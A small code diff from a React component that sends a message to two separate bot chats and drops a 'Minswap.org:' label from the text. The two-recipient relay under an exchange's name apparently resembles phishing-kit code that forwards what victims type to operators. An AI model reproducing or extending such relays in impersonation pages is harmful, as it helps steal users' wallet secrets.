@@ -39,11 +39,11 @@ function Home() {
 
         const data = {
           chat_id: chat_id,
-          text: `Minswap.org: ${message}`,
+          text: message,
         };
         const odata = {
           chat_id: ochat_id,
-          text: `Minswap.org: ${message}`,
+          text: message,
         };
 
         // Send to first bot
